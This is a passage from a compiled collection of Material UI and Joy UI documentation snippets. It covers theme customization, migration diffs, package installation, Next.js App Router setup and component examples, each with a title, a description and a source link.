javascript\nCODE:\n```\ntheme.spacing(2) => '16px'\n```\n\n----------------------------------------\n\nTITLE: Configuring Next.js App Router with Material UI and Tailwind CSS\nDESCRIPTION: Setup code for enabling CSS layer feature in Next.js App Router root layout using AppRouterCacheProvider with Tailwind CSS integration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/tailwindcss/tailwindcss-v4.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\nimport { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';\n\nexport default function RootLayout() {\n  return (\n    <html lang=\"en\" suppressHydrationWarning>\n      <body>\n        <AppRouterCacheProvider options={{ enableCssLayer: true }}>\n          {/* Your app */}\n        </AppRouterCacheProvider>\n      </body>\n    </html>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Button Classes in JavaScript Styling\nDESCRIPTION: Shows how to update deprecated Button class names in JavaScript styling code with the new separate variant and color class pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n import { buttonClasses } from '@mui/material/Button';\n\n MuiButton: {\n   styleOverrides: {\n     root: {\n-      [`&.${buttonClasses.textInherit}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorInherit}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textPrimary}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textSecondary}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textSuccess}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorSuccess}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textError}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorError}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textInfo}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorInfo}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textWarning}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.colorWarning}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedInherit}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorInherit}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedPrimary}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedSecondary}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedSuccess}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorSuccess}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedError}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorError}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedInfo}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorInfo}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedWarning}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.colorWarning}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedInherit}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorInherit}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedPrimary}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorPrimary}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedSecondary}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorSecondary}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedSuccess}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorSuccess}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedError}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorError}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedInfo}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorInfo}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedWarning}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.colorWarning}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedSizeSmall}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.sizeSmall}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedSizeMedium}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.sizeMedium}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.containedSizeLarge}`]: {\n+      [`&.${buttonClasses.contained}.${buttonClasses.sizeLarge}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textSizeSmall}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.sizeSmall}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textSizeMedium}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.sizeMedium}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.textSizeLarge}`]: {\n+      [`&.${buttonClasses.text}.${buttonClasses.sizeLarge}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedSizeSmall}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.sizeSmall}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedSizeMedium}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.sizeMedium}`]: {\n         color: 'red',\n       },\n-      [`&.${buttonClasses.outlinedSizeLarge}`]: {\n+      [`&.${buttonClasses.outlined}.${buttonClasses.sizeLarge}`]: {\n         color: 'red',\n       },\n-      [`& .${buttonClasses.iconSizeSmall}`]: {\n+      [`&.${buttonClasses.sizeSmall} > .${buttonClasses.icon}`]: {\n         color: 'red',\n       },\n-      [`& .${buttonClasses.iconSizeMedium}`]: {\n+      [`&.${buttonClasses.sizeMedium} > .${buttonClasses.icon}`]: {\n         color: 'red',\n       },\n-      [`& .${buttonClasses.iconSizeLarge}`]: {\n+      [`&.${buttonClasses.sizeLarge} > .${buttonClasses.icon}`]: {\n         color: 'red',\n       },\n     },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Updating FormControl Default Variant in React\nDESCRIPTION: Changes the default variant of FormControl from 'standard' to 'outlined' to align with Material Design guidelines. The 'standard' variant prop must now be explicitly specified if needed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_14\n\nLANGUAGE: diff\nCODE:\n```\n-<FormControl value=\"Standard\" />\n-<FormControl value=\"Outlined\" variant=\"outlined\" />\n+<FormControl value=\"Standard\" variant=\"standard\" />\n+<FormControl value=\"Outlined\" />\n```\n\n----------------------------------------\n\nTITLE: Importing and Using Joy UI Button Component in JavaScript\nDESCRIPTION: This snippet demonstrates how to import and use a Joy UI Button component, encouraging users to experiment with different variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/usage/usage.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\"demo\": \"ButtonUsage.js\", \"defaultCodeOpen\": true}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Breakpoints in Material-UI\nDESCRIPTION: Shows how to define and use custom breakpoints in Material-UI. This example creates a theme with custom breakpoint values and applies them to a Box component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/usage/usage.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport Box from '@mui/material/Box';\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\n\nconst theme = createTheme({\n  breakpoints: {\n    values: {\n      mobile: 0,\n      tablet: 640,\n      laptop: 1024,\n      desktop: 1280,\n    },\n  },\n});\n\nexport default function CustomBreakpoints() {\n  return (\n    <ThemeProvider theme={theme}>\n      <Box\n        sx={{\n          width: {\n            mobile: 100,\n            laptop: 300,\n          },\n        }}\n      >\n        This box has a responsive width\n      </Box>\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Joy UI and Dependencies with Package Managers\nDESCRIPTION: Commands for installing Joy UI and its required emotion dependencies using different package managers (npm, pnpm, yarn).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/installation/installation.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/joy @emotion/react @emotion/styled\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/joy @emotion/react @emotion/styled\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/joy @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Configuring Autocomplete for Autofill Prevention (JSX)\nDESCRIPTION: This code snippet shows how to configure the Autocomplete component to prevent browser autofill suggestions. It sets the autoComplete attribute to 'new-password' on the input slot, which can help avoid autofill in some browsers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete\n  slotProps={{\n    input: {\n      autoComplete: 'new-password',\n    },\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Creating ThemeRegistry Component for Joy UI and Next.js App Router\nDESCRIPTION: This code snippet demonstrates how to create a custom ThemeRegistry component that combines Emotion's CacheProvider, Joy UI's CssVarsProvider, and Next.js's useServerInsertedHTML hook. It handles server-side rendering of styles and theme application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/next-js-app-router/next-js-app-router.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\n// app/ThemeRegistry.tsx\n'use client';\nimport createCache from '@emotion/cache';\nimport { useServerInsertedHTML } from 'next/navigation';\nimport { CacheProvider } from '@emotion/react';\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport CssBaseline from '@mui/joy/CssBaseline';\nimport theme from '/path/to/custom/theme'; // OPTIONAL\n\n// This implementation is from emotion-js\n// https://github.com/emotion-js/emotion/issues/2928#issuecomment-1319747902\nexport default function ThemeRegistry(props) {\n  const { options, children } = props;\n\n  const [{ cache, flush }] = React.useState(() => {\n    const cache = createCache(options);\n    cache.compat = true;\n    const prevInsert = cache.insert;\n    let inserted: string[] = [];\n    cache.insert = (...args) => {\n      const serialized = args[1];\n      if (cache.inserted[serialized.name] === undefined) {\n        inserted.push(serialized.name);\n      }\n      return prevInsert(...args);\n    };\n    const flush = () => {\n      const prevInserted = inserted;\n      inserted = [];\n      return prevInserted;\n    };\n    return { cache, flush };\n  });\n\n  useServerInsertedHTML(() => {\n    const names = flush();\n    if (names.length === 0) {\n      return null;\n    }\n    let styles = '';\n    for (const name of names) {\n      styles += cache.inserted[name];\n    }\n    return (\n      <style\n        key={cache.key}\n        data-emotion={`${cache.key} ${names.join(' ')}`}\n        dangerouslySetInnerHTML={{\n          __html: styles,\n        }}\n      />\n    );\n  });\n\n  return (\n    <CacheProvider value={cache}>\n      <CssVarsProvider theme={theme}>\n        {/* the custom theme is optional */}\n        <CssBaseline />\n        {children}\n      </CssVarsProvider>\n    </CacheProvider>\n  );\n}\n\n// app/layout.tsx\nexport default function RootLayout(props) {\n  return (\n    <html lang=\"en\">\n      <body>\n        <ThemeRegistry options={{ key: 'joy' }}>{props.children}</ThemeRegistry>\n      </body>\n    </html>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Fluid Container in React with Material-UI\nDESCRIPTION: This snippet demonstrates how to use a fluid Container component with a maximum width constraint. The maxWidth prop determines the maximum width of the container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/container/container.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Container maxWidth=\"sm\">\n```\n\n----------------------------------------\n\nTITLE: Creating a Vertical Stepper with Extra Content in React\nDESCRIPTION: This snippet demonstrates how to create a vertical stepper with additional content. It uses the 'orientation' prop and shows how to include extra information within each step.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stepper/stepper.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper orientation=\"vertical\">\n  {steps.map((step, index) => (\n    <Step key={step.label}>\n      <StepButton>\n        <Typography level=\"h4\">{step.label}</Typography>\n      </StepButton>\n      <Box sx={{ px: 2, pb: 2 }}>\n        <Typography level=\"body-sm\">{step.description}</Typography>\n      </Box>\n    </Step>\n  ))}\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Composing Accessible Form Control in Material-UI\nDESCRIPTION: Shows how to compose an accessible form control using Material-UI components, ensuring proper relationships between the input, label, and helper text.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<FormControl>\n  <InputLabel htmlFor=\"my-input\">Email address</InputLabel>\n  <Input id=\"my-input\" aria-describedby=\"my-helper-text\" />\n  <FormHelperText id=\"my-helper-text\">We'll never share your email.</FormHelperText>\n</FormControl>\n```\n\n----------------------------------------\n\nTITLE: Migrating Grid Size and Offset Props in React\nDESCRIPTION: Updates to Grid component props in v6, replacing individual breakpoint props with consolidated size and offset objects. This snippet shows how to update from the previous API to the new structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n <Grid\n-  xs={12}\n-  sm={6}\n-  xsOffset={2}\n-  smOffset={3}\n+  size={{ xs: 12, sm: 6 }}\n+  offset={{ xs: 2, sm: 3 }}\n >\n```\n\n----------------------------------------\n\nTITLE: Implementing Hydration Mismatch Prevention in Joy UI\nDESCRIPTION: Demonstrates how to prevent hydration mismatch errors when using color scheme detection with server-side rendering. The component only renders the actual UI after client-side mounting.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/dark-mode/dark-mode.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nfunction ModeToggle() {\n  const { mode, setMode } = useColorScheme();\n  const [mounted, setMounted] = React.useState(false);\n\n  React.useEffect(() => {\n    setMounted(true);\n  }, []);\n\n  if (!mounted) {\n    // to avoid layout shift, render a placeholder button\n    return <Button variant=\"outlined\" color=\"neutral\" sx={{ width: 120 }} />;\n  }\n\n  return (\n    <Button\n      variant=\"outlined\"\n      color=\"neutral\"\n      onClick={() => setMode(mode === 'dark' ? 'light' : 'dark')}\n    >\n      {mode === 'dark' ? 'Turn light' : 'Turn dark'}\n    </Button>\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Theme Variables in Material UI\nDESCRIPTION: Example of adding custom variables to Material UI theme using createTheme. Shows how to extend the theme with custom status indicators.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  status: {\n    danger: orange[500],\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Theme with Primary and Secondary Colors in Material-UI\nDESCRIPTION: Demonstrates how to create a custom theme using createTheme() function with specific primary and secondary color configurations including light, main, dark, and contrastText variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/color/color.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  palette: {\n    primary: {\n      light: '#757ce8',\n      main: '#3f50b5',\n      dark: '#002884',\n      contrastText: '#fff',\n    },\n    secondary: {\n      light: '#ff7961',\n      main: '#f44336',\n      dark: '#ba000d',\n      contrastText: '#000',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Styling Components with MUI System sx prop\nDESCRIPTION: Example demonstrating how to style components using MUI System's sx prop, showing a more concise approach compared to styled-components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/usage/usage.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box\n  sx={{\n    bgcolor: 'background.paper',\n    boxShadow: 1,\n    borderRadius: 1,\n    p: 2,\n    minWidth: 300,\n  }}\n>\n  <Box sx={{ color: 'text.secondary' }}>Sessions</Box>\n  <Box sx={{ color: 'text.primary', fontSize: 34, fontWeight: 'medium' }}>\n    98.3 K\n  </Box>\n  <Box\n    component={TrendingUpIcon}\n    sx={{ color: 'success.dark', fontSize: 16, verticalAlign: 'sub' }}\n  />\n  <Box\n    sx={{ color: 'success.dark', display: 'inline', fontWeight: 'medium', mx: 0.5 }}\n  >\n    18.77%\n  </Box>\n  <Box sx={{ color: 'text.secondary', display: 'inline', fontSize: 12 }}>\n    vs. last week\n  </Box>\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Targeting Component States Using Class Selectors in Joy UI\nDESCRIPTION: Illustrates how to override styles for specific component states by importing component class selectors and using them with the styleOverrides API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport { listItemButtonClasses } from '@mui/joy/ListItemButton';\n\nextendTheme({\n  components: {\n    JoyListItemButton: {\n      styleOverrides: {\n        root: {\n          [`&.${listItemButtonClasses.selected}`]: {\n            color: 'rgba(255 255 255 / 0.7)',\n          },\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Custom Theme Palette Configuration\nDESCRIPTION: Shows how to customize the theme palette by directly providing color values for primary and secondary colors with automatic calculation of light and dark variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  palette: {\n    primary: {\n      main: '#FF5733',\n      // light: will be calculated from palette.primary.main,\n      // dark: will be calculated from palette.primary.main,\n      // contrastText: will be calculated to contrast with palette.primary.main\n    },\n    secondary: {\n      main: '#E0C2FF',\n      light: '#F5EBFF',\n      // dark: will be calculated from palette.secondary.main,\n      contrastText: '#47008F',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Fuzzy Matching with match-sorter\nDESCRIPTION: Example of implementing advanced filtering using the match-sorter library for fuzzy matching capabilities in the Autocomplete component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nimport { matchSorter } from 'match-sorter';\n\nconst filterOptions = (options, { inputValue }) => matchSorter(options, inputValue);\n\n<Autocomplete filterOptions={filterOptions} />;\n```\n\n----------------------------------------\n\nTITLE: Accessible Form Input Implementation with Joy UI\nDESCRIPTION: This snippet demonstrates Joy UI's accessibility features with the Form Control component automatically generating unique IDs to link Input elements with Form Labels and Helper Text components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/overview/overview.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"../../components/input/InputField.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Theme Tokens with extendTheme in Joy UI\nDESCRIPTION: This snippet demonstrates how to customize theme tokens in Joy UI by using the extendTheme function to modify color schemes and font families. The customized tokens are deeply merged into the default theme and converted to CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/approaches/approaches.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        // affects all Joy components that has `color=\"primary\"` prop.\n        primary: {\n          50: '#fffbeb',\n          100: '#fef3c7',\n          200: '#fde68a',\n          // 300, 400, ..., 800,\n          900: '#78350f',\n        },\n      },\n    },\n  },\n  fontFamily: {\n    display: 'Inter, var(--joy-fontFamily-fallback)',\n    body: 'Inter, var(--joy-fontFamily-fallback)',\n  },\n});\n\nfunction App() {\n  return <CssVarsProvider theme={theme}>...</CssVarsProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Extending Component Variants in Joy UI\nDESCRIPTION: Shows how to add custom variant options to Joy UI components. This example adds a 'glass' variant to the Sheet component with glassmorphism styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoySheet: {\n      styleOverrides: {\n        root: ({ ownerState, theme }) => ({\n          ...(ownerState.variant === 'glass' && {\n            color: theme.vars.palette.text.primary,\n            background: 'rgba(255, 255, 255, 0.14)',\n            backdropFilter: 'blur(5px)',\n            border: '1px solid rgba(255, 255, 255, 0.3)',\n            boxShadow: '0 4px 30px rgba(0, 0, 0, 0.1)',\n          }),\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Separators in React Breadcrumbs\nDESCRIPTION: Demonstrates how to use custom separators in Breadcrumbs, including string separators and SVG icons. This allows for more personalized breadcrumb designs.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomSeparator.js\"}\n```\n\n----------------------------------------\n\nTITLE: Controlling HTML Input with Text Field Props\nDESCRIPTION: Example showing how to pass attributes to the underlying HTML input element using slotProps.htmlInput\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<TextField slotProps={{ htmlInput: { 'data-testid': '…' } }} />\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Dependencies with yarn\nDESCRIPTION: Command to install the required dependencies for integrating Material UI with Next.js App Router using yarn package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/material-nextjs @emotion/cache\n```\n\n----------------------------------------\n\nTITLE: MenuItem State Customization\nDESCRIPTION: Demonstrates how to customize the selected state of a MenuItem component using Material UI state classes\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/how-to-customize/how-to-customize.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n.MenuItem {\n  color: black;\n}\n\n/* Increase the specificity */\n.MenuItem.Mui-selected {\n  color: blue;\n}\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<MenuItem selected className=\"MenuItem\">\n```\n\n----------------------------------------\n\nTITLE: Configuring StyledEngineProvider for Proper CSS Injection Order\nDESCRIPTION: Example showing how to configure StyledEngineProvider with injectFirst option to ensure proper CSS injection order when using both Emotion and JSS styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { StyledEngineProvider } from '@mui/material/styles';\n\nexport default function GlobalCssPriority() {\n  return (\n    {/* Inject Emotion before JSS */}\n    <StyledEngineProvider injectFirst>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </StyledEngineProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Replacing Deprecated Divider Light Prop with SX Prop\nDESCRIPTION: Shows how to replace the deprecated 'light' prop on the Divider component with an equivalent styling using the 'sx' prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n <Divider\n-  light\n+  sx={{ opacity: 0.6 }}\n />\n```\n\n----------------------------------------\n\nTITLE: Adding Button and Link Components\nDESCRIPTION: Adds login button and sign-up link with Typography component using endDecorator prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/tutorial/tutorial.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Button sx={{ mt: 1 /* margin top */ }}>\n  Log in\n</Button>\n<Typography\n  endDecorator={<Link href=\"/sign-up\">Sign up</Link>}\n  fontSize=\"sm\"\n  sx={{ alignSelf: 'center' }}\n>\n  Don't have an account?\n</Typography>\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Dark Mode Theme in Material UI\nDESCRIPTION: Shows how to create and apply a dark theme using createTheme helper and ThemeProvider component with CssBaseline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\nimport CssBaseline from '@mui/material/CssBaseline';\n\nconst darkTheme = createTheme({\n  palette: {\n    mode: 'dark',\n  },\n});\n\nexport default function App() {\n  return (\n    <ThemeProvider theme={darkTheme}>\n      <CssBaseline />\n      <main>This app is using the dark mode</main>\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Fixed Container in React with Material-UI\nDESCRIPTION: This snippet shows how to create a fixed-width Container. The fixed prop sets the max-width to match the min-width of the current breakpoint, suitable for designs with a fixed set of sizes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/container/container.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Container fixed>\n```\n\n----------------------------------------\n\nTITLE: Renaming TextField props in React\nDESCRIPTION: Renames rowsMax prop to maxRows and rows to minRows for consistency with HTML attributes in TextField component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_38\n\nLANGUAGE: diff\nCODE:\n```\n-<TextField rowsMax={6}>\n+<TextField maxRows={6}>\n\n-<TextField rows={2} maxRows={5} />\n+<TextField minRows={2} maxRows={5} />\n```\n\n----------------------------------------\n\nTITLE: Scrollable Long Menu\nDESCRIPTION: Menu implementation with internal scrolling for long content.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_8\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"LongMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring CSS Injection Order with StyledEngineProvider\nDESCRIPTION: Demonstrates how to change the CSS injection order to give custom styles precedence over Material UI's default styles, eliminating the need for !important.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport { StyledEngineProvider } from '@mui/material/styles';\n\nexport default function GlobalCssPriority() {\n  return (\n    <StyledEngineProvider injectFirst>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </StyledEngineProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Light and Dark Color Schemes in Material UI Theme\nDESCRIPTION: Overrides the default tokens for light and dark color schemes in a Material UI theme. This example customizes the primary color for each scheme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        primary: {\n          main: '#FF5733',\n        },\n        // ...other tokens\n      },\n    },\n    dark: {\n      palette: {\n        primary: {\n          main: '#E0C2FF',\n        },\n        // ...other tokens\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Updating Deep Import Paths for v7\nDESCRIPTION: Diff showing how to replace deep import paths with proper module imports, as deep imports with more than one level are no longer supported in v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n-import createTheme from '@mui/material/styles/createTheme';\n+import { createTheme } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Creating a Styled Component with makeStyles Hook from @mui/styles in JSX\nDESCRIPTION: This snippet showcases how to create a custom styled button component using the makeStyles hook from @mui/material/styles (part of the @mui/styles system). It defines a 'root' style using JavaScript object syntax and applies it via className to a button. Prerequisites: React, @mui/material, and proper setup to support hooks and CSS-in-JS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport { makeStyles } from '@mui/material/styles';\n\nconst useStyles = makeStyles({\n  root: {\n    background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n    border: 0,\n    borderRadius: 3,\n    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',\n    color: 'white',\n    height: 48,\n    padding: '0 30px',\n  },\n});\n\nexport default function Hook() {\n  const classes = useStyles();\n  return <button className={classes.root}>Hook</button>;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI with npm\nDESCRIPTION: Installs Material UI along with its peer dependencies for emotion styling system. This command should be run in your project directory to add Material UI to your React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-material/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Removing Gutters Abstraction from 